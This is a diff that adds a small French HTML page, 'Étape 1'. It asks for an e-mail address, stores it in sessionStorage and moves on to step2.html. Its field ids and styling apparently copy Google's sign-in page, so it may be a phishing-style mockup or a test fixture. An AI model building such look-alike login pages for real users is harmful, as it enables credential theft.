@@ -1,0 +1,4 @@
+<!doctype html><meta charset=utf-8><title>Étape 1</title>
+<style>body{font:16px sans-serif;padding:40px} input{display:block;margin:10px 0;padding:8px;width:260px}</style>
+<h1>Adresse e-mail</h1><div><input type="email" id="identifierId" autocomplete="username" aria-label="Adresse e-mail ou téléphone"><div role="button" id="next" style="cursor:pointer;background:#1a73e8;color:#fff;padding:8px;width:80px">Suivant</div></div>
+<script>document.getElementById('next').onclick=()=>{sessionStorage.u=document.getElementById('identifierId').value;location='step2.html'}</script>
